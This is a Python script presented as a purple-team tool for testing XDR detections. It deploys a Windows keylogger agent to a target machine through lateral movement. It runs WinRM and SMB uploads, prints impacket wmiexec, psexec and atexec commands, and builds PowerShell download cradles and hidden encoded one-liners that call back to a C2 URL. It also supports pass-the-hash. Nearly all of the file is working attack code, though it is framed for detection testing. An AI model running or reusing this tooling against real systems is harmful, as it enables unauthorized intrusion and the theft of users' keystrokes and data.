#!/usr/bin/env python3
"""
Purple Team - Lateral Movement Deployer
========================================
MITRE ATT&CK:
  T1570 - Lateral Tool Transfer
  T1021.006 - Remote Services: Windows Remote Management (WinRM)
  T1021.002 - Remote Services: SMB/Windows Admin Shares
  T1047 - Windows Management Instrumentation (WMI)
  T1059.001 - PowerShell

Pushes the Windows keylogger agent to a target machine and executes it.
Supports multiple lateral movement methods for XDR testing.

XDR detections this should trigger:
  - Lateral tool transfer via SMB (file copy to admin share)
  - Remote command execution via WinRM / WMI / PsExec
  - PowerShell download cradle execution
  - Remote service creation
  - Logon type 3 (network) from attacker IP
"""

import argparse
import base64
import os
import subprocess
import sys
import json
import urllib.request
from pathlib import Path

AGENT_SCRIPT = Path(__file__).parent / "windows-agent.ps1"


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  PURPLE TEAM - Lateral Movement Deployer                     ║
║  MITRE ATT&CK: T1570 / T1021 / T1047 / T1059.001           ║
║  FOR AUTHORIZED SECURITY TESTING ONLY                        ║
╚══════════════════════════════════════════════════════════════╝
""")


# ═══════════════════════════════════════════════════════════════════
#  Method 1: WinRM (T1021.006)
# ═══════════════════════════════════════════════════════════════════
def deploy_winrm(target: str, user: str, password: str, c2_url: str, token: str):
    """
    Uses Evil-WinRM or PowerShell remoting to deploy and execute the agent.
    XDR should detect: WinRM connection, remote PowerShell, encoded command.
    """
    print(f"[*] Method: WinRM (T1021.006)")
    print(f"[*] Target: {target}")

    agent_code = AGENT_SCRIPT.read_text()
    # Inject C2 URL into the script
    agent_code = agent_code.replace(
        'http://ATTACKER_IP:8443',
        c2_url
    )

    # Base64 encode for PowerShell -EncodedCommand
    ps_bytes = agent_code.encode("utf-16-le")
    encoded = base64.b64encode(ps_bytes).decode()

    # Option A: Using evil-winrm (if installed)
    print(f"\n[*] Option A - Evil-WinRM command:")
    print(f"    evil-winrm -i {target} -u '{user}' -p '{password}'")
    print(f"    Then run: powershell -File C:\\Windows\\Temp\\windows-agent.ps1 -C2Url {c2_url}")

    # Option B: Using PowerShell from Linux/macOS via HTTP
    print(f"\n[*] Option B - Direct WinRM via Python:")

    try:
        import winrm
        session = winrm.Session(
            f"http://{target}:5985/wsman",
            auth=(user, password),
            transport="ntlm"
        )

        # Step 1: Upload agent
        print(f"[*] Uploading agent to target...")
        upload_cmd = f"""
$content = @'
{agent_code}
'@
Set-Content -Path 'C:\\Windows\\Temp\\pt-agent.ps1' -Value $content
Write-Output 'Agent uploaded'
"""
        result = session.run_ps(upload_cmd)
        print(f"    {result.std_out.decode().strip()}")

        # Step 2: Execute agent
        print(f"[*] Executing agent on target...")
        exec_cmd = f"""
Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url} -AuthToken {token}' -WindowStyle Hidden
Write-Output 'Agent started'
"""
        result = session.run_ps(exec_cmd)
        print(f"    {result.std_out.decode().strip()}")
        print(f"[+] Agent deployed and running on {target}")

    except ImportError:
        print(f"[!] pywinrm not installed. Install: pip3 install pywinrm")
        print(f"[*] Generating manual commands instead...\n")
        generate_manual_commands(target, user, c2_url, token, "winrm")


# ═══════════════════════════════════════════════════════════════════
#  Method 2: SMB + Remote Exec (T1021.002 + T1570)
# ═══════════════════════════════════════════════════════════════════
def deploy_smb(target: str, user: str, password: str, c2_url: str, token: str):
    """
    Copies agent via SMB admin share, then executes via various methods.
    XDR should detect: SMB file write to admin share, remote service/schtask.
    """
    print(f"[*] Method: SMB + Remote Exec (T1021.002 / T1570)")
    print(f"[*] Target: {target}")

    agent_code = AGENT_SCRIPT.read_text()
    agent_code = agent_code.replace('http://ATTACKER_IP:8443', c2_url)

    # Write modified agent to temp
    tmp_agent = Path("/tmp/pt-agent.ps1")
    tmp_agent.write_text(agent_code)

    # Step 1: Copy via SMB using smbclient or impacket
    print(f"\n[*] Step 1 - Copy agent via SMB admin share:")

    # Try impacket smbclient
    print(f"    Using impacket-smbclient:")
    print(f"    impacket-smbclient '{user}:{password}@{target}'")
    print(f"    > use C$")
    print(f"    > cd Windows\\Temp")
    print(f"    > put /tmp/pt-agent.ps1")

    # Or smbclient
    print(f"\n    Or using smbclient:")
    print(f"    smbclient '//{target}/C$' -U '{user}%{password}' -c 'cd Windows\\Temp; put /tmp/pt-agent.ps1'")

    try:
        result = subprocess.run(
            ["smbclient", f"//{target}/C$", "-U", f"{user}%{password}",
             "-c", f"cd Windows\\Temp; put {tmp_agent}"],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            print(f"[+] Agent copied via SMB")
        else:
            print(f"[!] SMB copy failed: {result.stderr.strip()}")
            print(f"[*] Try manually with the commands above")
    except FileNotFoundError:
        print(f"[!] smbclient not found. Install: brew install samba")
    except Exception as e:
        print(f"[!] SMB error: {e}")

    # Step 2: Remote execution options
    print(f"\n[*] Step 2 - Execute remotely:")
    print(f"\n    Option A - impacket-wmiexec (T1047):")
    print(f"    impacket-wmiexec '{user}:{password}@{target}' 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}'")

    print(f"\n    Option B - impacket-psexec (creates a service - T1543.003):")
    print(f"    impacket-psexec '{user}:{password}@{target}' 'powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}'")

    print(f"\n    Option C - impacket-atexec (scheduled task - T1053.005):")
    print(f"    impacket-atexec '{user}:{password}@{target}' 'powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}'")


# ═══════════════════════════════════════════════════════════════════
#  Method 3: Download Cradle / Fileless (T1059.001 + T1105)
# ═══════════════════════════════════════════════════════════════════
def deploy_cradle(target: str, user: str, password: str, c2_url: str, token: str):
    """
    Hosts the agent on the C2 server and executes a download cradle on target.
    XDR should detect: PowerShell download cradle, IEX, encoded command.
    """
    print(f"[*] Method: Download Cradle / Fileless (T1059.001 / T1105)")
    print(f"[*] Target: {target}")

    agent_code = AGENT_SCRIPT.read_text()
    agent_code = agent_code.replace('http://ATTACKER_IP:8443', c2_url)

    # Base64 the entire script for the cradle
    encoded_agent = base64.b64encode(agent_code.encode("utf-16-le")).decode()

    # Cradle options
    print(f"\n[*] Download cradle commands (run on target via any remote exec):\n")

    print(f"  Cradle 1 - IEX (Invoke-Expression):")
    print(f"    powershell -ep Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/api/health')\"")
    print(f"    (Would need agent hosted on a web endpoint)\n")

    print(f"  Cradle 2 - EncodedCommand (entire agent base64'd):")
    print(f"    powershell -ep Bypass -EncodedCommand {encoded_agent[:60]}...")
    print(f"    (Full encoded command: {len(encoded_agent)} chars)\n")

    print(f"  Cradle 3 - Invoke-Command via WinRM:")
    print(f"    $cred = Get-Credential")
    print(f"    Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{")
    print(f"        IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded_agent[:40]}...')))")
    print(f"    }}\n")

    # Save encoded command to file for easy use
    cradle_file = Path(__file__).parent / "encoded-agent.txt"
    cradle_file.write_text(encoded_agent)
    print(f"[+] Full encoded agent saved to: {cradle_file}")
    print(f"    Use: powershell -ep Bypass -EncodedCommand $(cat encoded-agent.txt)")

    # Generate one-liner
    oneliner = f"powershell -ep Bypass -w Hidden -EncodedCommand {encoded_agent}"
    oneliner_file = Path(__file__).parent / "oneliner.txt"
    oneliner_file.write_text(oneliner)
    print(f"[+] Full one-liner saved to: {oneliner_file}")


# ═══════════════════════════════════════════════════════════════════
#  Method 4: WMI (T1047)
# ═══════════════════════════════════════════════════════════════════
def deploy_wmi(target: str, user: str, password: str, c2_url: str, token: str):
    """
    Uses WMI for remote execution after SMB file copy.
    XDR should detect: WMI process creation, wmiprvse.exe spawning PowerShell.
    """
    print(f"[*] Method: WMI (T1047)")
    print(f"[*] Target: {target}")
    print(f"\n[*] Requires agent already on target (use --method smb first)")

    print(f"\n    impacket-wmiexec '{user}:{password}@{target}'")
    print(f"    Then: powershell -ep Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url} -AuthToken {token}")

    print(f"\n    Or one-shot:")
    print(f"    impacket-wmiexec '{user}:{password}@{target}' 'powershell -ep Bypass -w Hidden -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}'")


# ═══════════════════════════════════════════════════════════════════
#  Helper: Generate manual commands
# ═══════════════════════════════════════════════════════════════════
def generate_manual_commands(target, user, c2_url, token, method):
    print(f"── Manual Deployment Commands ──────────────────────")
    print(f"")
    print(f"1. Copy agent to target:")
    print(f"   smbclient '//{target}/C$' -U '{user}' -c 'cd Windows\\Temp; put /tmp/pt-agent.ps1'")
    print(f"")
    print(f"2. Execute remotely (pick one):")
    print(f"")
    print(f"   # WinRM")
    print(f"   evil-winrm -i {target} -u '{user}'")
    print(f"   > powershell -ep Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}")
    print(f"")
    print(f"   # WMI")
    print(f"   impacket-wmiexec '{user}@{target}'")
    print(f"   > powershell -ep Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}")
    print(f"")
    print(f"   # PsExec")
    print(f"   impacket-psexec '{user}@{target}'")
    print(f"   > powershell -ep Bypass -File C:\\Windows\\Temp\\pt-agent.ps1 -C2Url {c2_url}")
    print(f"────────────────────────────────────────────────────")


# ═══════════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════════
def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Deploy keylogger agent to Windows target via lateral movement"
    )
    parser.add_argument("target", help="Target Windows IP or hostname")
    parser.add_argument("-u", "--user", required=True, help="Username (DOMAIN\\user or user)")
    parser.add_argument("-p", "--password", default="", help="Password (or use -H for hash)")
    parser.add_argument("-H", "--hash", default="", help="NTLM hash for pass-the-hash")
    parser.add_argument("--c2-url", default="http://YOUR_IP:8443",
                        help="C2 server URL the agent should call back to")
    parser.add_argument("--token", default="purpleteam-xdr-test-2024",
                        help="Auth token")
    parser.add_argument("-m", "--method",
                        choices=["winrm", "smb", "wmi", "cradle", "all"],
                        default="smb",
                        help="Lateral movement method (default: smb)")

    args = parser.parse_args()

    if not AGENT_SCRIPT.exists():
        print(f"[!] Agent script not found: {AGENT_SCRIPT}")
        sys.exit(1)

    methods = {
        "winrm": deploy_winrm,
        "smb":   deploy_smb,
        "wmi":   deploy_wmi,
        "cradle": deploy_cradle,
    }

    if args.method == "all":
        for name, func in methods.items():
            print(f"\n{'='*60}")
            func(args.target, args.user, args.password, args.c2_url, args.token)
    else:
        methods[args.method](args.target, args.user, args.password, args.c2_url, args.token)

    print(f"\n[*] Done. Monitor the collection server for incoming data.")
    print(f"[*] Check your XDR for lateral movement and execution alerts.")


if __name__ == "__main__":
    main()
